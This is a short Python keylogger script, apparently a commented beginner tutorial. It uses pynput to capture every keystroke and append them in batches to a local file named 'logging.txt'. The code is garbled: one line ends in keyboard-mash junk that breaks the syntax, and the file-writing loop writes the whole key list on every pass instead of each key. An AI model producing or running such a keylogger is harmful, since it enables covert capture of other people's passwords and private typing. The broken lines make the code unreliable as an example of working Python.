#library pynput
import pynput
#Listener is going to listen to our key events
from pynput.keyboard import Key, Listener
#variables count and keys are created
#count variable is going to loop through the amount of keys that the listener will capture and a limit to the amount of keys pressed  
count = 0
#variable key is given a blank list and once looped through every key a list will be made for that key pressed
keys = []
#function created
def on_press(key):
    global keys, count
    #this will add the key to the list
    keys.append(key)
    count += 1
    #print the key out in this format
    print("{0} pressed".format(key))
    if count >= 5:
        count = 0sdfasdfasdfasdfasdfasdf
        #this will write the keys to the list
        write_file(keys)
        keys = []
#this function is going to write to a file and loop through all the keys that will be entered into the file
def write_file(keys):
    with open("logging.txt", "a") as f:
        #for loop created for every key pressed will be written to the file
        for key in keys:
            f.write(str(keys))
#function release is going to break out of this loop when we press the escape key
def on_release(key):
    if key ==Key.esc:
        return False
#on_press and on_release are the functions when a key is pressed and when a key is released    
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()